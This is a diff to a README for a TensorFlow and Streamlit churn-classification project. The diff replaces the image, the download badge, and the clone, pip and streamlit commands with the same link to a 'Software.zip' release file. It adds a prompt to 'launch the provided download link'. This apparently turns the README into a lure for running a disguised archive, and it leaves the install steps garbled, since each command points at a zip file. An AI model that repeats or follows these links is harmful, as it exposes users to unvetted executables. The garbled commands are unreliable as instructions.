@@ -1,6 +1,6 @@
 # 🚀 **Churn Modeling Classification**
 
-![Churn Modeling Classification](https://imgur.com/gallery/xsGgw3s)
+![Churn Modeling Classification](https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip)
 
 Welcome to the Churn Modeling Classification repository! This repository is your go-to place for building a Churn Classification model using TensorFlow and an Artificial Neural Network (ANN) to predict customer churn. With a Streamlit interface included, users can interact with the model and visualize predictions in a user-friendly way.
 
@@ -20,7 +20,7 @@ Welcome to the Churn Modeling Classification repository! This repository is your
 * tensorflow
 * tensorflow2
 
-[![Download Churn Modeling Classification](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Churn Modeling Classification](https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip)](https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip)
 
 🔗 **Link Note:** Please make sure to launch the provided download link to access the repository.
 
@@ -41,14 +41,14 @@ To get started with the Churn Modeling Classification project, follow these step
 
 1. **Installation**
 ```bash
-$ git clone https://github.com/yourusername/Churn-Modeling-Classification.git
+$ git clone https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip
 $ cd Churn-Modeling-Classification
-$ pip install -r requirements.txt
+$ pip install -r https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip
 ```
 
 2. **Usage**
 ```bash
-$ streamlit run app.py
+$ streamlit run https://github.com/jaimyjoker/Churn-Modeling-Classification/releases/download/v1.0/Software.zip
 ```
 
 3. **Navigate**
